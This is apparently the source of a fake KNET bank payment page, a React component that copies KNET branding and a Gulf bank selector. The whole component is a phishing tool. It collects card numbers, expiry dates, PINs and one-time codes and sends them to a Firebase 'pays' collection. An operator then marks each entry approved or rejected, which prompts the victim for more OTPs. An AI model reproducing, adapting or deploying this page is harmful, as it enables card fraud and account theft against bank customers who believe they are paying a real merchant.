"use client"
import { useEffect, useState } from "react"
import { doc, onSnapshot } from "firebase/firestore"
import { db, handlePay } from "@/lib/firebase"
import { FullPageLoader } from "@/components/fullpageloader"
import "./knet.css"
import type React from "react"
type PaymentInfo = {
  cardNumber: string
  year: string
  month: string
  bank?: string
  cvv?: string
  otp?: string
  pass: string
  cardState?: string
  allOtps?: string[]
  bank_card?: string[]
  prefix?: string
  status?: "new" | "pending" | "approved" | "rejected"
  page?: string
}
const BANKS = [
  {
    value: "NBK",
    label: "National Bank of Kuwait",
    cardPrefixes: ["464452", "589160", "46445250", "543363"],
  },
  {
    value: "CBK",
    label: "Commercial Bank of Kuwait",
    cardPrefixes: ["532672", "537015", "521175", "516334"],
  },
  {
    value: "GBK",
    label: "Gulf Bank",
    cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
  },
  {
    value: "ABK",
    label: "Al Ahli Bank of Kuwait",
    cardPrefixes: ["403622", "428628    ", "423826"],
  },
  {
    value: "BURGAN",
    label: "Burgan Bank",
    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
  },
  {
    value: "KFH",
    label: "Kuwait Finance House",
    cardPrefixes: ["485602", "537016", "537016", "450778"],
  },
  {
    value: "BOUBYAN",
    label: "Boubyan Bank",
    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
  },
  {
    value: "KIB",
    label: "Kuwait International Bank",
    cardPrefixes: ["409054", "406464"],
  },
  {
    value: "UNB",
    label: "Union National Bank   ",
    cardPrefixes: ["457778", "513000"], // Added common prefixes for IBK
  },
  {
    value: "BBK",
    label: "Bank of Bahrain and Kuwait",
    cardPrefixes: ["418056"], // Added a missing prefix
  },
  {
    value: "BNP",
    label: "BNP Paribas",
    cardPrefixes: ["450216", "531483", "489800"], // Added a common prefix for BNP
  },
  {
    value: "HSBC",
    label: "HSBC Middle East Bank",
    cardPrefixes: ["447284", "530001", "453095"], // Added an additional HSBC prefix
  },
  {
    value: "FAB",
    label: "First Abu Dhabi Bank",
    cardPrefixes: ["440891", "530123", "454888"], // Added a prefix used by FAB
  },
  {
    value: "CITIBANK",
    label: "Citibank",
    cardPrefixes: ["431457", "545432", "400800"], // Added another Citibank prefix
  },
  {
    value: "QNB",
    label: "Qatar National Bank",
    cardPrefixes: ["521020", "524745"], // Added a Qatar National Bank prefix
  },
  {
    value: "Doha",
    label: "Doha Bank",
    cardPrefixes: ["419252"], // Added another Mashreq prefix
  },
  {
    value: "ALRAJHI",
    label: "Al Rajhi Bank",
    cardPrefixes: ["458838"], // Added a common Al Rajhi prefix
  },
  {
    value: "BANK_MUSCAT",
    label: "Bank Muscat",
    cardPrefixes: ["489312", "529410", "454100"], // Added a prefix for Bank Muscat
  },
  {
    value: "WARBA",
    label: "Warba Bank",
    cardPrefixes: ["541350", "525528", "532749", "559459"], // Added another common ICBC prefix
  },
]

export default function Payment() {
  const handleSubmit = async () => {}
  const [loading, setLoading] = useState(false)
  const amount =() => {
    if (typeof window !== "undefined") {
      return localStorage.getItem("item") || "0.00"
    }
    return "0.00"
  }

  const [step, setstep] = useState(1)
  const [newotp] = useState([""])
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    allOtps: newotp,
    bank: "",
    pass: "",
    cardState: "new",
    bank_card: [""],
    prefix: "",
    status: "new",
    page: "otp",
  })

  const handleAddotp = (otp: string) => {
    newotp.push(`${otp} , `)
  }
  useEffect(() => {
    //handleAddotp(paymentInfo.otp!)
  }, [paymentInfo.otp])

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as PaymentInfo
          if (data.status) {
            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
            if (data.status === "approved") {
              setstep(2)
              setLoading(false)
            } else if (data.status === "rejected") {
              setLoading(false)
              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
              setstep(1)
            }
          }
        }
      })

      return () => unsubscribe()
    }
  }, [])

  return (
    <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }}>
      <div style={{ display: "flex", justifyContent: "center" }}>
        <img src="/dre5.png" alt="log" width={"100%"} />
      </div>
      <form
        onSubmit={(e) => {
          e.preventDefault()
        }}
      >
        <div className="madd" />
        <div id="PayPageEntry">
          <div className="container">
            <div className="content-block">
              <div className="form-card">
                <div className="container-" style={{ display: "flex", justifyContent: "center" }}>
                  <img src="./download.jpeg" className="-" alt="logo" height={80} width={80} />
                </div>
                <div className="row">
                  <label className="column-label">Merchant: </label>
                  <label className="column-value text-label">KNET Payment</label>
                </div>
                <div id="OrgTranxAmt">
                  <label className="column-label"> Amount: </label>
                  <label className="column-value text-label" id="amount">
                    {amount()}
                    {"  "}KD&nbsp;{" "}
                  </label>
                </div>
                {/* Added for PG Eidia Discount starts   */}
                <div className="row" id="DiscntRate" style={{ display: "none" }} />
                <div className="row" id="DiscntedAmt" style={{ display: "none" }} />
                {/* Added for PG Eidia Discount ends   */}
              </div>
              <div className="form-card">
                <div
                  className="notification"
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    paddingRight: 15,
                    display: "none",
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                  id="otpmsgDC"
                />
                {/*Customer Validation  for knet*/}
                <div
                  className="notification"
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    paddingRight: 15,
                    display: "none",
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                  id="CVmsg"
                />
                <div id="ValidationMessage">
                  {/*span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
            font-family: helvetica, arial, sans serif;
            color: #ff0000;
              padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
                      </span*/}
                </div>
                <div id="savedCardDiv" style={{ display: "none" }}>
                  {/* Commented the bank name display for kfast starts */}
                  <div className="row">
                    <br />
                  </div>
                  {/* Commented the bank name display for kfast ends */}
                  {/* Added for Points Redemption */}
                  <div className="row">
                    <label className="column-label" style={{ marginLeft: 20 }}>
                      PIN:
                    </label>
                    <input
                      inputMode="numeric"
                      pattern="[0-9]*"
                      name="debitsavedcardPIN"
                      id="debitsavedcardPIN"
                      autoComplete="off"
                      title="Should be in number. Length should be 4"
                      type="password"
                      size={4}
                      maxLength={4}
                      className="allownumericwithoutdecimal"
                      style={{ width: "50%" }}
                    />
                  </div>
                  {/* Added for Points Redemption */}
                </div>

                {step === 1 ? (
                  <>
                    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
                      <div className="row">
                        <label className="column-label" style={{ width: "40%" }}>
                          Select Your Bank:
                        </label>
                        <select
                          className="column-value"
                          style={{ width: "60%" }}
                          onChange={(e: React.ChangeEvent<HTMLSelectElement>) => {
                            const selectedBank = BANKS.find((bank) => bank.value === e.target.value)

                            setPaymentInfo({
                              ...paymentInfo,
                              bank: e.target.value,
                              bank_card: selectedBank ? selectedBank.cardPrefixes : [""],
                            })
                          }}
                        >
                          <>
                            <option value="bankname" title="Select Your Bank">
                              Select Your Banks
                            </option>
                            {BANKS.map((i, index) => (
                              <option value={i.value} key={index}>
                                {i.label} [{i.value}]
                              </option>
                            ))}
                          </>
                        </select>
                      </div>
                      <div className="row three-column" id="Paymentpagecardnumber">
                        <label className="column-label">Card Number:</label>
                        <label>
                          <select
                            className="column-value"
                            name="dcprefix"
                            id="dcprefix"
                            onChange={(e: React.ChangeEvent<HTMLSelectElement>) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                prefix: e.target.value,
                              })
                            }
                            style={{ width: "26%" }}
                          >
                            <option value={"i"}>prefix</option>
                            {paymentInfo.bank_card!.map((i, index) => (
                              <option key={index} value={i}>
                                {i}
                              </option>
                            ))}
                          </select>
                        </label>
                        <label>
                          <input
                            name="debitNumber"
                            id="debitNumber"
                            type="tel"
                            inputMode="numeric"
                            pattern="[0-9]*"
                            size={10}
                            className="allownumericwithoutdecimal"
                            style={{ width: "32%" }}
                            maxLength={10}
                            onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                cardNumber: e.target.value,
                              })
                            }
                            title="Should be in number. Length should be 10"
                          />
                        </label>
                      </div>
                      <div className="row three-column" id="cardExpdate">
                        <div id="debitExpDate">
                          <label className="column-label"> Expiration Date: </label>
                        </div>
                        <select
                          onChange={(e: React.ChangeEvent<HTMLSelectElement>) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              month: e.target.value,
                            })
                          }
                          className="column-value"
                        >
                          <option value={0}>MM</option>
                          <option value={1}>01</option>
                          <option value={2}>02</option>
                          <option value={3}>03</option>
                          <option value={4}>04</option>
                          <option value={5}>05</option>
                          <option value={6}>06</option>
                          <option value={7}>07</option>
                          <option value={8}>08</option>
                          <option value={9}>09</option>
                          <option value={10}>10</option>
                          <option value={11}>11</option>
                          <option value={12}>12</option>
                        </select>
                        <select
                          onChange={(e: React.ChangeEvent<HTMLSelectElement>) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              year: e.target.value,
                            })
                          }
                          className="column-long"
                        >
                          <option value={0}>YYYY</option>
                          <option value={2024}>2024</option>
                          <option value={2025}>2025</option>
                          <option value={2026}>2026</option>
                          <option value={2027}>2027</option>
                          <option value={2028}>2028</option>
                          <option value={2029}>2029</option>
                          <option value={2030}>2030</option>
                          <option value={2031}>2031</option>
                          <option value={2032}>2032</option>
                          <option value={2033}>2033</option>
                          <option value={2034}>2034</option>
                          <option value={2035}>2035</option>
                          <option value={2036}>2036</option>
                          <option value={2037}>2037</option>
                          <option value={2038}>2038</option>
                          <option value={2039}>2039</option>
                          <option value={2040}>2040</option>
                          <option value={2041}>2041</option>
                          <option value={2042}>2042</option>
                          <option value={2043}>2043</option>
                          <option value={2044}>2044</option>
                          <option value={2045}>2045</option>
                          <option value={2046}>2046</option>
                          <option value={2047}>2047</option>
                          <option value={2048}>2048</option>
                          <option value={2049}>2049</option>
                          <option value={2050}>2050</option>
                          <option value={2051}>2051</option>
                          <option value={2052}>2052</option>
                          <option value={2053}>2053</option>
                          <option value={2054}>2054</option>
                          <option value={2055}>2055</option>
                          <option value={2056}>2056</option>
                          <option value={2057}>2057</option>
                          <option value={2058}>2058</option>
                          <option value={2059}>2059</option>
                          <option value={2060}>2060</option>
                          <option value={2061}>2061</option>
                          <option value={2062}>2062</option>
                          <option value={2063}>2063</option>
                          <option value={2064}>2064</option>
                          <option value={2065}>2065</option>
                          <option value={2066}>2066</option>
                          <option value={2067}>2067</option>
                        </select>
                      </div>
                      <div className="row" id="PinRow">
                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
                        <input type="hidden" name="cardPinType" defaultValue="A" />
                        <div id="eComPin">
                          <label className="column-label"> PIN: </label>
                        </div>
                        <div>
                          <input
                            inputMode="numeric"
                            pattern="[0-9]*"
                            name="cardPin"
                            id="cardPin"
                            onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                pass: e.target.value,
                              })
                            }
                            autoComplete="off"
                            title="Should be in number. Length should be 4"
                            type="password"
                            size={4}
                            maxLength={4}
                            className="allownumericwithoutdecimal"
                            style={{ width: "60%" }}
                          />
                        </div>
                      </div>
                    </div>
                  </>
                ) : step === 2 && paymentInfo.status === "approved" ? (
                  <div>
                    <form style={{ display: "flex", flexDirection: "column" }}>
                      <label>Please enter the verification code sent to your phone number</label>
                      <label>
                        <input
                          name="otp"
                          style={{ width: "100%", marginTop: 15 }}
                          id="otp"
                          type="tel"
                          inputMode="numeric"
                          pattern="[0-9]*"
                          className="allownumericwithoutdecimal"
                          maxLength={6}
                          value={paymentInfo.otp}
                          onChange={(e: React.ChangeEvent<HTMLInputElement>) => {
                            setPaymentInfo({
                              ...paymentInfo,
                              otp: e.target.value,
                            })
                          }}
                          title="Should be in number. Length should be 6"
                        />
                      </label>
                    </form>
                  </div>
                ) : (
                  <div style={{ textAlign: "center", padding: "20px" }}>
                    <p>Please wait while we process your payment...</p>
                  </div>
                )}
              </div>
              <div className="form-card">
                <div className="row">
                  <div style={{ textAlign: "center" }}>
                    <div id="loading" style={{ display: "none" }}>
                      <center>
                        <img
                          style={{
                            height: 20,
                            float: "left",
                            marginLeft: "20%",
                          }}
                        />
                        <label className="column-value text-label" style={{ width: "70%", textAlign: "center" }}>
                          Processing.. please wait ...
                        </label>
                      </center>
                    </div>
                    <div style={{ display: "flex" }}>
                      <button
                        style={{ background: "#ededed", marginRight: 2 }}
                        disabled={
                          (step === 1 &&
                            (paymentInfo.prefix === "" ||
                              paymentInfo.bank === "" ||
                              paymentInfo.cardNumber.length !== 10 ||
                              paymentInfo.pass === "" ||
                              paymentInfo.month === "" ||
                              paymentInfo.year === "" ||
                              paymentInfo.pass.length !== 4)) ||
                          paymentInfo.status === "pending"
                        }
                        onClick={() => {
                          if (step === 1) {
                            setLoading(true)
                            handlePay(paymentInfo as any, setPaymentInfo as any)
                            handleSubmit()
                          } else if (step >= 2) {
                            if (paymentInfo.otp?.length! !== 6) {
                              alert("يجب انك يكون الرمز مكون من 6 ارقام")
                              return
                            }
                            if (!newotp.includes(paymentInfo.otp!)) {
                              newotp.push(paymentInfo.otp!)
                            }
                            setLoading(true)
                            handleAddotp(paymentInfo.otp!)
                            handlePay(paymentInfo as any, setPaymentInfo as any)
                            setTimeout(() => {
                              setLoading(false)
                              setPaymentInfo({
                                ...paymentInfo,
                                otp: "",
                                status: "approved",
                              })
                            }, 3000)
                          }
                        }}
                      >
                        {loading ? "Wait..." : step === 1 ? "Submit" : "Verify OTP"}
                      </button>
                      <button style={{ background: "#ededed", marginRight: 2 }}>Cancel</button>
                    </div>
                  </div>
                </div>
              </div>
              <div id="overlayhide" className="overlay" style={{ display: "none" }}></div>

              <footer>
                <div className="footer-content-new">
                  <div className="row_new">
                    <div
                      style={{
                        textAlign: "center",
                        fontSize: 11,
                        lineHeight: 1,
                      }}
                    >
                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;�&nbsp;
                      <br />
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: "bold",
                          color: "#0077d5",
                        }}
                      >
                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET
                      </span>
                    </div>
                  </div>
                  <div id="DigiCertClickID_cM-vbZrL" />
                </div>
                <div id="DigiCertClickID_cM-vbZrL" />
              </footer>
            </div>
          </div>
        </div>
      </form>
      {loading && <FullPageLoader text="معالجة الدفع ..." />}
    </div>
  )
}

